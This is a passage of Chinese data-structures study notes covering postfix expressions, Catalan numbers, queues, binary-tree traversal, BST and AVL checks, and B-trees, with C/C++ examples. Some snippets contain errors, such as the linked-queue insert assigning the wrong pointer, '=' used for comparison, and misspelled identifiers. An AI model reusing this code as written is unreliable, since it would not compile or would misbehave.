该运算符为”(“，则直接存入stack栈； 该运算符为”)”，则将stack栈中第一个”(“前的所有运算符依次出栈，并依次存入post栈，但是”(“和”)”都不存入post栈； 若该运算符为非括号，则将该运算符和stack栈顶运算符进行比较，若高于栈顶运算符，则直接存入stack栈，否则将栈顶运算符出栈，存入post栈，然后继续与新的栈顶元素比较，直到该运算符能存入stack。（使得post中优先级高的运算符在前，或者说接近栈底）当扫描完后，stack栈中还有运算符时，则将所有的运算符出栈，存入post栈。 A+B*(C-D)-E/F转换为后缀表达式的过程如下： 方法二：使用语法树实现 方法三：加括号法 先按照运算符的优先级对中缀表达式加括号，变成((a+(b*c))+(((d*e)+f)*g)) 将运算符移到括号的后面，变成((a(bc)*)+(((de)*f)+g)*)+ 去掉括号，得到abc*+de*f+g*+ 后缀表达式的求值通过后缀表示计算表达式值的过程为：顺序扫描表达式的每一项，然后根据它的类型做如下相应操作：如果该项是操作数，则将其压入栈中；如果该项是操作符&lt;op&gt;，则连续从栈中退出两个操作数Y和X，形成运算指令X&lt;op&gt;Y，并将计算结果重新压入栈中。当表达式的所有项都扫描并处理完后，栈顶存放的就是最后的计算结果。 2.3 Catalan数卡特兰数（Catalan number）是组合数学中一个常出现在各种计数问题中的数列。 数列的前几项为：1, 1, 2, 5, 14, 42, 132, 429, 1430, 4862, … 相关的经典问题： 进出栈序列 n个元素进栈序列为：1，2，3，4，…，n，则有多少种出栈序列？ 将进栈表示为 +1，出栈表示为 -1，根据栈本身的特点，每次出栈的时候，必定之前有元素入栈，即对于每个 -1 前面都有一个 +1 相对应。因此，出栈序列的 所有前缀和 必然大于等于 0，并且 +1 的数量 等于 -1 的数量。 当出现某一前缀和小于0时（即出现前缀和等于-1的情况，-1的数量比+1多一个），该出栈序列就是非法的。假设+1和-1的数量均为n，将该前缀取反之后，就会变成+1的数量比-1多一个，即存在n+1个+1，n-1个-1。取反后的序列与之前的序列是一一对应的。因此，非法序列的数量有$C^{n+1}{2n}$。因此，合法的出栈序列的数量为$\\LARGE C^{n}{2n}-C^{n+1}{2n}&#x3D;\\frac{C^{n}{2n}}{n+1}$。此时我们就得到了卡特兰数的通项$\\LARGE \\frac{C^{n}_{2n}}{n+1}$。 括号序列 n 对括号，则有多少种 “括号匹配” 的括号序列 左括号看成 +1，右括号看成 -1，那么就和上题的进出栈一样，每次有右括号的时候，必定之前有左括号匹配，且序列的 所有前缀和 必然大于等于 0，并且 +1 的数量 等于 -1 的数量。因此共有$\\LARGE \\frac{C^{n}_{2n}}{n+1}$种序列。 二叉树 n + 1 个叶子节点能够构成多少种形状不同的（国际）满二叉树（结点要么是叶子结点，要么它有两个子结点，且叶子节点均在最后一层） 使用深度优先搜索这个满二叉树，向左扩展时标记为 +1，向右扩展时标记为 -1。 由于每个非叶子节点都有两个左右子节点，所有它必然会先向左扩展，再向右扩展。总体下来，左右扩展将会形成匹配，即变成进出栈的题型。n + 1个叶子结点会有 2n 次扩展，构成$\\LARGE \\frac{C^{n}_{2n}}{n+1}$种形状不同的满二叉树。 基本上所有的卡特兰数问题经过一定的转换都可以还原成进出栈问题，其中都会存在一种匹配关系，如进出栈匹配，括号匹配等。一旦计数问题中存在这种关系，那我们就需要去考虑这是否是卡特兰数问题。此外，我们还可以记住序列前四项：1, 1, 2, 5，这些将有利于我们联想到卡特兰数。 例如，以下问题的题解均为卡特兰数： 有2n个人排成一行进入剧场。 入场费5元。其中只有n个人有一张5元钞票，另外n人只有10元钞票，剧院无其他钞票，问有多少种方法使得只要有10元的人买票，售票处就有5元的钞票找零? $\\LARGE \\frac{C^{n}{2n}}{n+1}$种。一位大城市的律师在她住所以北n个街区和以东n个街区处工作。每天她走2n个街区去上班。如果她从不穿越(但可以碰到)从家到办公室的对角线，那么有多少条可能的道路? $\\LARGE \\frac{C^{n}{2n}}{n+1}$种。在圆上选择2n个点，将这些点成对连接起来使得所得到的n条线段不相交的方法数? $\\LARGE \\frac{C^{n}{2n}}{n+1}$种。矩阵连乘：p&#x3D;$a_1$x$a_2$x…x$a_n$，依据乘法结合律，不改变其顺序，只用括号表示成对的乘积，试问有几种括号化的方案? $\\LARGE \\frac{C^{n}{2n}}{n+1}$种。 2.4 队列一种操作受限的线性表，仅允许在表的一端（队尾）进行插入操作（入队），而在表的另一端（队首）进行删除操作（出队）。因此，队列也叫做先进先出表。 队列的顺序存储结构1234typedef struct&#123; ElemType data[MaxSize]; // 队列中的元素 int front, rear; // 队头指针和队尾指针，front、rear初始值-1&#125;SqQueue; 队空的条件：q-&gt;front == q-&gt;rear。 队满的条件：q-&gt;rear == MaxSize-1。 进队：rear增1，然后将元素e插入到该位置。 1234567bool enQueue(SqQueue *&amp;q, ElemType e)&#123; if(q-&gt;rear == MaxSize-1) // 队满 return false; q-&gt;rear++; // 队尾增1 q-&gt;data[q-&gt;rear] = e; // 队尾插入元素e return true;&#125; 出队：front增1，然后将该位置的元素赋给e。 1234567bool deQueue(SqQueue *&amp;q, ElemType &amp;e)&#123; if(q-&gt;front == q-&gt;rear) // 队空 return false; q-&gt;front++; e = q-&gt;data[q-&gt;front]; return true;&#125; 队列的元素个数：rear-front。 进队时rear增1，出队时front增1，这样整个队列会在数组中慢慢向右移动，容易出现假溢出的情况。 环形队列按照q-&gt;rear == MaxSize-1的队满条件判断时，可能存在假溢出的情况，另一端仍然存在空位置。解决的办法是把data数组的前后端连接在一起，形成环形队列（循环队列）。用数组实现队列的话，循环队列一般是必需的。 环形队列的队空条件：q-&gt;front == q-&gt;rear。 环形队列的队满条件：(q-&gt;rear+1) % MaxSize == q-&gt;front。 环形队列的进队：rear增1，然后将元素e插入到该位置。 1234567bool enQueue(SqQueue *&amp;q, ElemType e)&#123; if((q-&gt;rear+1) % MaxSize == q-&gt;front) // 队满 return false; q-&gt;rear = (q-&gt;rear+1) % MaxSize; // 队尾增1，注意：环形队列的rear指针是循环增1，也就是还要对MaxSize取余 q-&gt;data[q-&gt;rear] = e; // 队尾插入元素e return true;&#125; 环形队列的出队：front增1，然后将该位置的元素赋给e。 1234567bool deQueue(SqQueue *&amp;q, ElemType &amp;e)&#123; if(q-&gt;front == q-&gt;rear) // 队空 return false; q-&gt;front = (q-&gt;front+1) % MaxSize; // 队头增1，注意：环形队列的front指针是循环增1，也就是还要对MaxSize取余 e = q-&gt;data[q-&gt;front]; return true;&#125; 环形队列的元素个数：(rear-front+MaxSize) % MaxSize。 队列的链式存储结构——链队 链队中的数据结点类型DataNode的声明如下： 1234typedef struct qnode&#123; ElemType data; // 存放元素 struct qnode *next; // 下一个结点指针&#125;DataNode; 链队头结点类型LinkQuNode的声明如下： 1234typedef struct&#123; DataNode *front; // 指向队首结点 DataNode *rear; // 指向队尾结点&#125;LinkQuNode; 队空的条件：q-&gt;front == NULL或者q-&gt;rear == NULL。 队满的条件：不考虑。 进队：新建结点存放元素e（由p指向它），将结点p插入作为尾结点。要注意原来队列为空的情况。 1234567891011bool enQueue(LinkQuNode *&amp;q, ElemType e)&#123; DataNode *p = new DataNode(); p-&gt;data = e; p-&gt;next = NULL; if(q-&gt;rear==NULL) // 队列为空，front和rear将都指向新增的结点p q-&gt;front=q-&gt;rear=q; else&#123; q-&gt;rear-&gt;next = p // 队尾插入元素e q-&gt;rear = p; // 更新队尾指针 &#125;&#125; 出队：取出队首结点的data值并将其删除。要注意原来的队列仅有一个数据结点的情况。 12345678910111213bool deQueue(LinkQuNode *&amp;q, ElemType &amp;e)&#123; DataNode *t; // 用于暂存队首结点 if(q-&gt;rear == NULL) // 队空 return false; t = q-&gt;front; // 取队首结点 if(q-&gt;front == q-&gt;rear) // 原来的队列仅有一个数据结点 q-&gt;front=q-&gt;rear=NULL; else q-&gt;front = q-&gt;front-&gt;next; e = t-&gt;data; free(t); return true;&#125; 3 树3.1 树的基本概念和性质基本概念树是N (N&gt;&#x3D;0)个结点的有限集。当N&#x3D;0时， 树为空树。N&gt;0时，有且仅有一个结点作为树的 根节点。 树中一个结点的子结点个数称为该 结点的度 ，树中结点的最大度数称为 树的度。通常将度为m的树成为 m次树。 度不为0的结点称为 分支结点，度为0的结点称为 叶子结点。 结点的层次从树根开始定义，根结点为第1层，它的子结点为第2层，以此类推。结点的深度是从根结点开始自顶向下逐层累加的；结点的高度是从叶结点开始自底向上逐层累加的。树中结点的最大层数称为树的高度或深度。 有序树和无序树：将子结点视为有顺序的树称为有序树，反之则称为无序树。有序树中，一个结点其子结点按从左到右顺序出现是有关联的。 森林是m (m≥0)棵互不相交的树的集合。森林的概念与树的概念十分相近，因为只要把树的根结点删去就成了森林。反之，只要给n棵独立的树加上一个结点，并把这n棵树作为该结点的子树，则森林就变成了树。 性质树具有如下最基本的性质: 树中的结点数等于所有结点的度数加1。 度为m的树中第i层上至多有$m^{i-1}$个结点（i≥1）。 高度为h的m叉树至多有$(m^h-1)&#x2F;(m- 1)$个结点。（1、$m$、$m^2$、…、$m^{h-1}$的等比数列求和） 具有n个结点的m叉树的最小高度为$[log_{m}(n(m -1)+1)]$。 （根据$n&#x3D;(m^h-1)&#x2F;(m- 1)$计算得到） 树的存储结构 双亲存储结构 树的一种顺序存储结构，用一组连续空间存储树的所有结点，每个结点中设有一个伪指针指示其双亲结点的位置。固定根结点的双亲结点位置为-1。 1234typedef struct&#123; ElemType data; // 存放结点的值 int parent; // 存放双亲结点位置&#125;PTree[MAxSize]; 特点：容易查找某个结点的双亲结点，但是在求某个结点的孩子结点时需要遍历整个树。 孩子链存储结构 每个结点的存储空间不仅包括结点值，还有指向其所有孩子结点的指针。需要按照树的度来设计结点的孩子结点指针的指针域个数。 1234typedef struct node&#123; ElemType data; // 存放结点的值 struct node *sons[MaxSons]; // 指向孩子结点，MaxSons为最多的孩子结点个数，即该树的度&#125;PTree[MAxSize]; 特点：查找孩子结点方便，但是查找双亲结点费时，并且当树的度较大时存在较多的空指针域。 孩子兄弟链存储结构 每个结点设计了3个域，包括数据元素域、一个指向该结点的左边第一个孩子的指针域、一个指向该结点的下一个兄弟结点的指针域。这样每个结点就固定只有2个指针域，且这两个指针域是有序的（类似二叉树的存储结构）。 12345typedef struct tnode&#123; ElemType data; // 存放结点的值 struct tnode *hp; // 指向兄弟结点 struct tnode *vp; // 指向孩子结点&#125;TSBNode; 3.2 二叉树二叉树是另一种树形结构(是n (n≥0)个结点的有限集合)，其特点是每个结点至多只有两棵子树(即二叉树中不存在度大于2的结点)，并且，二叉树的子树有左右之分，其次序不能任意颠倒。 二叉树是有序树，若将其左、右子树颠倒，就成为另一棵不同的二叉树。即使树中结点只有一棵子树，也要区分它是左子树还是右子树。 **注意：**二叉树与度为2的有序树的区别：度为2的树至少有3个结点，而二叉树可以为空；度为2的有序树的孩子结点的左右次序是相对于另一孩子结点而言的，如果某个结点只有一个孩子结点，这个孩子结点就无须区分其左右次序，而二叉树无论其孩子数是否为2，均需确定其左右次序。 下面介绍几种特殊的二叉树。 满二叉树叶子结点都集中在二叉树的最下一层， 并且除叶子结点之外的每个结点度数均为2的二叉树称为满二叉树，即树中的每一层都含有最多的结点，如图13-1(a)所示。或者也可以说一棵高度为h且含有$2^h-1$ 个结点的树为满二叉树。 可以对满二叉树按层序编号：约定编号从根结点(根结点编号为1) 起，自上而下，自左向右。这样每个结点对应一一个编号， 对于编号为i的结点，如果有双亲，其双亲为⌊i&#x2F;2⌋，如果有左孩子，则左孩子为2i；如果有右孩子，则右孩子为2i+1。 完全二叉树设一个高度为h，有n个结点的二叉树，当且仅当其每一个结点都与高度为h的满二叉树中编号为1~n的结点一一对应时，称为完全二叉树，如图13- 1(b)所示。这种树的特点如下: ① 若$i≤\\lfloor n&#x2F;2 \\rfloor$，则结点i为分支结点，否则为叶子结点。（层次遍历，前一半的结点均为分支结点，后一半均为叶子结点） ② **叶子结点只可能在层次最大的两层上出现。最大层次中的叶子结点都依次排列在该层最左边的位置上**。 ③ 如果有度为1的结点，只可能有一个，且该结点只有左孩子而无右孩子。 ④ 按层序编号后，一旦出现某结点(其编号为i)为叶子结点或只有左孩子，则编号大于i的结点均为叶子结点。 ⑤ 若n为奇数，则每个分支结点都有左孩子和右孩子；若n为偶数，则编号最大的分支结点(编号为n&#x2F;2)只有左子女，没有右子女，其余分支结点左、右子女都有。 注意：性质3中表明完全二叉树中，度为1的结点数 要么为0，要么为1。当总结点数为偶数时，度为1的结点数为1；当总结点数为奇数时，度为1的结点数为0。叶子结点数 为：总结点数&#x2F;2。 二叉树的性质二叉树的性质 非空二叉树上叶子结点（度为0）数等于度为2的结点数加1，即$\\large N_0&#x3D;N_2+1$。 证明：设度为0、1和2的结点个数分别为$N_0$、$N_1$和$N_2$，结点总数$N$&#x3D;$N_0$+$N_1$+$N_2$。再看二叉树中的分支数，除根结点外，其余结点都有一个分支进入，设B为分支总数，则$N&#x3D;B+1$。由于这些分支是由度为1或2的结点射出的，所以又有$B$ &#x3D;$N_1$+$2N_2$。于是得$\\large N_0&#x3D;N_2+1$. 非空二叉树上第K层上至多有$2^{k-1}$个结点(K≥1)。 **高度为H的二叉树至多有$2^H-1$个结点(H≥1)**。 对完全二叉树按从上到下、从左到右的顺序依次编号1, 2, …, N，则有以下关系： a) 当i&gt;1时，结点i的双亲结点编号为⌊i&#x2F;2⌋，即当i为偶数时，其双亲结点的编号为i&#x2F;2，它是双亲结点的左孩子；当i为奇数时，其双亲结点的编号为(i -1)&#x2F;2，它是双亲结点的右孩子。 b) 当2i≤N时，结点i的左孩子编号为2i,否则无左孩子。 c) 当2i+1≤N时，结点i的右孩子编号为2i+1, 否则无右孩子。 d) 结点i所在层次(深度)为$⌊log_2i⌋+1$。 具有N个(N&gt;0)结点的 完全二叉树的高度 为$\\lfloor log_2N \\rfloor +1$ 或者 $\\lceil log_2(N+1) \\rceil \\space$。 例题： 二叉树的存储结构 二叉树的顺序存储结构 顺序存储就是用一组地址连续的存储单元依次自上而下、自左而右存储完全二叉树的结点元素，即将完全二叉树编号为i的结点元素存储在某个数组下标为i-1的分量中。对于一般二叉树，则应将其每个结点与完全二叉树上的结点相对照，存储在一维数组的相应分量中。 1typedef ElemType SqBinTree[MaxSize]; # 为方便运算，一般下标为0的位置空着，空结点用&quot;#&quot;表示 然而，在最坏的情况下，一个高度为H且只有H个结点的单支树却需要占据接近$2^H-1$个存储单元。因此，顺序存储结构一般仅适用在完全二叉树中。 二叉树的链式存储结构 每个结点由三个域组成，包括数据域、指向该结点左孩子结点的指针域、指向该结点右孩子结点的指针域。 12345typedef struct node&#123; ElemType data; struct node *lchild; struct node *rchild; &#125;BTNode; 容易验证，在有n个结点的二叉树中，每个结点有2个指针域，因此一共存在2n个链域。其中，除根结点外，其余结点均有指针指向，因此，有n-1个有效链域，n+1个空链域。 &#x3D;&#x3D;二叉树的遍历&#x3D;&#x3D;很多问题的求解是借助二叉树的遍历完成的。重点为二叉树遍历的非递归算法。 &#x3D;&#x3D;先序遍历&#x3D;&#x3D; 12345678/*-------------递归-------------*/void PreOrder(BTNode *b)&#123; if(b != NULL)&#123; print(&quot;%c&quot;, b-&gt;data); PreOrder(b-&gt;lchild); PreOrder(b-&gt;rchild); &#125;&#125; 1234567891011121314151617181920212223/*-------------非递归（使用顺序栈实现）-------------*/vector&lt;int&gt; preorderTraversal(BTNode* root) &#123; vector&lt;int&gt; res; if(root == NULL) return res; stack&lt;BTNode*&gt; s; //辅助栈 //根节点先进栈 s.push(root); //直到栈中没有节点 while(!s.empty())&#123; //每次栈顶就是访问的元素 BTNode* node = s.top(); s.pop(); res.push_back(node-&gt;val); //如果有右孩子，则右孩子进栈 if(node-&gt;right) s.push(node-&gt;right); //如果有左孩子，则左孩子进栈 if(node-&gt;left) s.push(node-&gt;left); &#125; return res;&#125; &#x3D;&#x3D;中序遍历&#x3D;&#x3D; 12345678/*-------------递归-------------*/void InOrder(BTNode *b)&#123; if(b != NULL)&#123; InOrder(b-&gt;lchild); print(&quot;%c&quot;, b-&gt;data); InOrder(b-&gt;rchild); &#125;&#125; 1234567891011121314151617181920/*-------------非递归（使用顺序栈实现）-------------*/vector&lt;int&gt; inorderTraversal(BTNode* root) &#123; vector&lt;int&gt; res; stack&lt;BTNode*&gt; s; //辅助栈 //当树结点不为空或栈中有结点时 while(root != NULL || !s.empty())&#123; //每次先找到最左结点，路径上的结点均入栈 while(root != NULL)&#123; s.push(root); root = root-&gt;left; &#125; //弹出栈顶 BTNode* node = s.top(); s.pop(); res.push_back(node-&gt;val); //左孩子为空，进入右孩子结点 root = node-&gt;right; &#125; return res;&#125; &#x3D;&#x3D;后序遍历&#x3D;&#x3D; 12345678/*-------------递归-------------*/void PostOrder(BTNode *b)&#123; if(b != NULL)&#123; PostOrder(b-&gt;lchild); PostOrder(b-&gt;rchild); print(&quot;%c&quot;, b-&gt;data); &#125;&#125; 12345678910111213141516171819202122232425262728/*-------------非递归（使用顺序栈实现）-------------*/vector&lt;int&gt; postorderTraversal(BTNode* root) &#123; vector&lt;int&gt; res; // 返回结果 stack&lt;BTNode*&gt; s; //辅助栈 BTNode* pre = NULL; while(root != NULL || !s.empty())&#123; // 指针root和栈均为空时结束循环 //每次先找到最左边的结点，路径上的结点均入栈 while(root != NULL)&#123; s.push(root); root = root-&gt;left; &#125; //弹出栈顶 BTNode* node = s.top(); s.pop(); //如果该结点没有右孩子或是右孩子已经访问过 if(node-&gt;right == NULL || node-&gt;right == pre)&#123; //访问该结点自身 res.push_back(node-&gt;val); //且记录为访问过了 pre = node; &#125;else&#123; //有右孩子，则该结点入栈，先去访问右孩子 s.push(node); root = node-&gt;right; &#125; &#125; return res;&#125; 层序遍历（借助队列实现） 12345678910111213141516171819202122/*-------------使用队列实现-------------*/vector&lt;vector&lt;int&gt; &gt; levelOrder(BTNode* root) &#123; vector&lt;vector&lt;int&gt; &gt; res; if (root == NULL) return res; queue&lt;BTNode *&gt; qu; qu.push(root); while (!qu.empty()) &#123; int size = qu.size(); vector&lt;int&gt; vec; while (size--) &#123; // 取队首结点 BTNode *node = qu.front(); qu.pop(); vec.push_back(node-&gt;val); // 左右孩子入队 if (node-&gt;left) qu.push(node-&gt;left); if (node-&gt;right) qu.push(node-&gt;right); &#125; if (vec.size() &gt; 0) res.push_back(vec); &#125; return res;&#125; 3.3 二叉树的应用 判断两颗二叉树是否相同。 运用递归的方法，按照先序遍历对比即可。 12345678910111213141516typedef struct node &#123; int val; struct node *left; struct node *right;&#125;BTNode;bool isEqual (BTNode* node1, BTNode* node2) &#123; //树为空的情况 if (nodel == NULL &amp;&amp; node2 = NULL) return 1; if (!nodel || !node2) return 0; //根结点相等，继续对比左孩子和右孩子 if (nodel-&gt;val == node2-&gt;val) return isEqual (node1-&gt;left, node2-&gt;left) &amp;&amp; isEqual (node1-&gt;right, node2-&gt;right); else return 0; &#125;&#125; 进一步的，比较两棵可以旋转的二叉树是否相等。二叉树的左右子结点可以旋转是指可以把二叉树的左结点旋转成为右结点，右结点旋转成为左结点。(2012. 百度) 若左右子结点可以旋转的话，需要将递归的return代码改为如下内容： 12return (isEqual (node1-&gt;left, node2-&gt;left) &amp;&amp; isEqual (node1-&gt;right, node2-&gt;right)) || (isEqual (node1-&gt;left, node2-&gt;right) &amp;&amp; isEqual (node1-&gt;right, node2-&gt;left)); 求二叉树的深度 从根结点到叶结点依次经过的结点(含根、叶结点)形成树的一条路径，最长路径的长度为树的深度。（相当于做后序遍历） 123456789101112131415typedef struct node &#123; int val; struct node *left; struct node *right;&#125;BTNode;int BTHeight(BTNode *root)&#123; int lefth, righth; if(root == NULL) return 0; else&#123; lefth = BTHeight(root-&gt;left); righth = BTHeight(root-&gt;right); return (lefth &gt; righth)? (lefth+1):(righth+1); &#125;&#125; 求二叉树中结点的最大距离 如果我们把二叉树视为一个图，父子结点之间的连线视为双向的，我们姑且定义“距离”为两结点之间边的个数。写一个程序求一棵二叉树中相距最远的两个结点之间的距离。 分析：计算-一个二叉树的最大距离有两个情况： 情况A：路径经过左子树的最深结点，通过根结点，再到右子树的最深结点。情况B：路径不穿过根结点，而是左子树或右子树的最大距离路径，取其大者。 只需要计算这两个情况的路径距离，并取其大者，就是该二叉树的最大距离。 123456789101112131415161718192021222324typedef struct node &#123; int val; struct node *left; struct node *right;&#125;BTNode;struct RESULT&#123;//定义返回结果 int MaxDistance; //最大距离 int MaxDepth;//最大深度&#125;;RESULT GetMaxDistance (BTNode* root) &#123; if (!root) &#123; RESULT empty = &#123; 0, -1 &#125;; /*最大深度初始化为-1是因为调用者要对其加1，然后变为0，使得无子树的最大深度为0*/ return empty; &#125; RESULT lhs = GetMaxDistance (root-&gt;left); RESULT rhs = GetMaxDistance (root-&gt;right); RESULT result; result.MaxDepth = max (lhs.MaxDepth+1, rhs.MaxDepth+1); // 树的最大深度 result.MaxDistance = max (max(lhs.MaxDistance, rhs.MaxDistance), // 情况B lhs.MaxDepth+rhs.MaxDepth+2); // 情况A return result;&#125; 一棵二叉树每个结点包含一个整数，请设计一个算法输出所有满足条件的路径：此路径上的所有结点之和等于给定值。注意此类路径不要求必须从根结点开始，满足条件的路径不唯一。 该题可利用先序遍历： 123456789101112131415161718192021222324// 输出结果void printbuffer (vector&lt;int&gt; buffer, int level, int i2) &#123; for (int i=level; i &lt;= i2; i++) &#123; cout&lt;&lt;buffer[i] &lt;&lt;&quot; &quot;; &#125; cout&lt;&lt;endl;&#125;void findSum (BTNode* head, int sum, vector&lt;int&gt; buffer, int level) &#123; if (head == NULL) return; //默认void int tmp = sum; buffer.push_ back(head-&gt;val); // 当前结点加入buffer for (int i=level; i &gt; -1; i--) &#123; // 减去buffer中已有元素 tmp -= buffer[i]; if(tmp == 0) // 找到路径 printbuffer(buffer, i, level); &#125; findSum(head-&gt;left, sum, buffer, leve1+1); // 深度level加1（buffer大小加1），继续遍历左孩子结点 // 回溯到当前结点，然后继续遍历右孩子结点 buffer.pop_back(); level -= 1; findSum (head-&gt;right, sum, buffer, level+1);&#125; 由遍历序列构造二叉树（重建二叉树） 在先序遍历序列中，第一个结点一定是二叉树的根结点，而在中序遍历中，根结点必然将中序序列分割成两个子序列，前一个子序列就是根结点的左子树的中序序列，后一个子序列是根结点的右子树的中序序列。根据这两个子序列，可以在先序序列中找到对应的左子序列和右子序列。在先序序列中，左子序列的第一个结点是左子树的根结点，右子序列的第一个结点是右子树的根结点。如此递归地进行下去，便能唯一地确定这棵二叉树。即先序序列和中序序列可以唯一地确定一棵二叉树。 同理，由二叉树的后序序列和中序序列也可以唯一地确定一棵二叉树，因为后序序列的最后一个结点就如同先序序列的第一个结点， 可以将中序序列分割成两个子序列，然后采用类似的方法递归地进行划分，就可以得到一棵二叉树。 由二叉树的层序序列和中序序列也可以唯一地确定一棵二叉树。需要注意的是，如果只知道二叉树的先序序列和后序序列，是无法唯一确定一棵二叉树的。 例1：求先序序列（ABCDEFGHI）和中序序列（BCAEDGHFI）所确定的二叉树。 由先序序列确定根结点，再由中序序列确定该根结点的左子树、右子树。再依次递归下去。 例2：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1, 2, 4, 7, 3, 5, 6, 8}和中序遍历序列{4, 7, 2, 1, 5, 3, 8, 6}，则重建二叉树并输出它的后序遍历序列。(剑指Offer例题) 1234567891011121314151617181920212223typedef struct node &#123; int val; struct node *left; struct node *right;&#125;BTNode;BTNode *CreatBT1(char *pre, char *in, int n)&#123; // pre存放先序序列，in存放中序序列，n为二叉树的结点个数，返回构造的二叉树的根结点指针b BTNode *b; char *p; int k; if(n&lt;=0) return NULL; b = new BTNode(); b-&gt;val = *pre; // 根结点 for(p=in;p&lt;in+n;p++)&#123; // 在中序序列中寻找根结点pre if(*p == *pre) break; &#125; k = p-in; // 确定根结点在中序序列in中的位置k，也是左子树的序列长度 b-&gt;left = CreatBT1(pre+1, in, k); // 递归构造左子树，pre+1和in均指向左子树序列的开头 b-&gt;right = CreatBT1(pre+k+1, p+1, n-k-1); // 递归构造右子树，pre+k+1和p+1均指向右子树列的开头 return b;&#125; 3.4 树的应用二叉排序树 BST二叉排序树，也称为二叉查找树，二叉搜索树，或BST。二叉排序树或者是一棵空树，或者是一棵具有下列特性的非空二 叉树： 若左子树非空，则左子树上所有结点关键字值均小于根结点的关键字值。 若右子树非空，则右子树上所有结点关键字值均大于根结点的关键字值。 左、右子树本身也分别是一棵二叉排序树。 由此定义可知，二叉排序树是一个递归的数据结构。 根据二叉排序树的定义，有**左子树结点值 &lt; 根结点值 &lt; 右子树结点值**。所以对二叉排序树进行中序遍历，可以得到一个递增的有序序列。 二叉排序树的查找操作的时间复杂度是$O(log_2N)$，比较次数与树的深度有关。 例如，图13-5的二叉排序树的中序遍历序列为123468。 判断一个二叉树是否为二叉排序树 使用中序遍历二叉树，判断是否为递增序列，复杂度O(n)。 1234567891011121314151617181920int prev1 = INT_ MIN; //定义为最小的整数typedef struct node &#123; int val; struct node *lchild, *rchild;&#125;BTNode;int JudgeBST (BTNode *bt) &#123; int b1, b2; if(bt == NULL) return 1; else &#123; // 中序遍历 b1 = JudgeBST (bt-&gt;lchi1d); if(b1 == 0 || bt-&gt;val &lt;= prev1) // 左子树不是二叉排序树，或者根结点值不大于prev1 return 0; prev1 = bt-&gt;val; // 更新prev1为根结点的值，即右子树的所有结点值均要大于prev1 b2 = JudgeBST (bt-&gt;rchild); return b2;&#125; 平衡二叉树 AVL为了避免树的高度增长过快，降低二叉排序树的性能，我们规定在插入和删除二叉树结点时，要保证任意结点的左、右子树高度差的绝对值不超过1，并将这样的二叉排序树称为平衡二叉树，简称平衡树(AVL树)。定义结点左子树与右子树的高度差为该结点的平衡因子，则平衡二叉树结点的平衡因子的值只可能是-1、0或1。 因此，平衡二叉树可定义为它或者是一棵空树，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且 左子树和右子树的高度差的绝对值不超过1。 平衡二叉树的操作效率（查询，插入，删除）效率较高，时间复杂度是$O(log_2N)$，即树的深度。 图13-6(b)所示是不平衡的二叉树。结点中的值为该结点的平衡因子。 判断一棵二叉树是不是平衡二叉树。 解法一：递归的思路，遍历树的每个结点，求出其左右子树的深度，计算深度差。 12345678910bool IsBalanced (BTNode* root) &#123; if (root == NULL) return true; int left_Depth = BTHeight (root-&gt;left) ; int right_Depth = BTHeight (root-&gt;right) ; int diff = left_Depth - right_Depth; if(diff &gt; 1 || diff &lt; -1) return false; return IsBalanced (root-&gt;left) &amp;&amp; IsBalanced (root-&gt;right);&#125; 解法二：解法一虽然简洁但是每个结点会被遍历多次，效率较低。如果我们用后序遍历的方式遍历二叉树的每一个结点， 在遍历到一个结点之前我们已经遍历了它的左右子树。只要在遍历每个结点的时候记录它的高度，我们就可以一边遍历一边判断每个结点是不是平衡的。下面是这种思路的参考代码: 123456789101112131415bool IsBalanced (BTNode* root, int* Depth) &#123; if (root == NULL) &#123; *Depth=0; return true; &#125; int left_Depth, right_Depth; if (IsBalanced (root-&gt;left, &amp;left_Depth) &amp;&amp; IsBalanced (root-&gt;right, &amp;right_Depth)) &#123; int diff=left_Depth - right_Depth; if(diff &lt;= 1 &amp;&amp; diff&gt;= -1)&#123; *Depth = 1 + (left_Depth &gt; right_Depth ? left_Depth : right_Depth); // 取左右子树中深度的最大值 return true; &#125; &#125; return false;&#125; 解法三：除此之外，下面的方法也是可行的，且形式更加简洁。求出根结点的最大深度与最小深度，则最大深度与最小深度之差dis就是树中任一子树深度差最大值，所以只要dis小于等于1，此树就是平衡二叉树，代码如下： 12345678910111213141516// 求树的最大深度int maxDepth (BTNode* root) &#123; if (root == NULL) return 0; return 1 + max (maxDepth(root-&gt;left), maxDepth(root-&gt;right));&#125;// 求树的最小深度int minDepth (TreeNode* root) &#123; if (root == NULL) return 0; return 1 + min (minDepth(root-&gt;left), minDepth(root-&gt;right)) ;&#125;// 计算根结点的最大深度与最小深度之差，小于等于1就说明是平衡二叉树bool isBalanced (TreeNode* root) &#123; return (maxDepth(root) - minDepth(root) &lt;= 1);&#125; B树和B+树参考：https://www.cnblogs.com/xiaofengshan/p/15443140.html B树和B+树都是多路查找树，为了解决数据量大，树的高度大增（二叉树）而产生的一种数据结构。 B树 B树又称为多路平衡查找树，是二叉排序树的扩展，满足平衡的性质，所有结点的平衡因子均等于0，结点又拥有多个子树，对于组织和维护外存文件系统非常有效（数据库）。 把树中结点所拥有的最大的子树数目称为 B树的阶。通常记为m。一颗m阶B树或为空树，或为满足如下特性的m叉树： 树中每个结点至多有m个孩子结点。（同时至多含有m-1个关键字，每两颗子树指针夹着一个关键字)； 若根结点不是叶子结点，则至少有两个孩子结点。(至少一个关键字)； 除根结点外的所有非叶子结点至少有$\\lceil m&#x2F;2 \\rceil$棵子树。（即至少含有$\\lceil m&#x2F;2 \\rceil -1$个关键字）； 所有的外部结点出现在同一个层次上，不带信息，但是计算B树的高度时需要考虑外部结点。(就像是折半查找判断树中查找失败的结点）。 **每一个结点中的关键字按递增的顺序排列**，关键字两边为指向孩子结点的指针。 B树中的非叶子结点对应数据库查找时的关键字，叶子结点对应要查找的详细记录，而外部结点对应查找失败，指向它的指针为NULL，不含有任何信息。一颗含有n个关键字的B树有n+1个外部结点。 B树的插入 向B树插入结点时，只能向叶子结点插入。 当叶子结点的关键字个数小于m-1时，直接在该结点增加关键字即可，注意保持递增。 当叶子结点的关键字个数等于m-1时，无法继续增加关键字。这时采用 分裂法，比如一棵3阶B树，结点的关键字个数最多为2。有一关键字为50的结点需要插入，定位到在叶子节点{20、30}中插入时，发现关键字已满。 此时对该叶子结点进行分裂，选取{20、30、50}的中位数30作为双亲结点提升到上一层中，其余关键字作为孩子结点留在本层。若关键字30提升到双亲结点后，造成双亲结点的关键字数量超过m-1，那么双亲结点也进行同样的分裂。 B树的删除 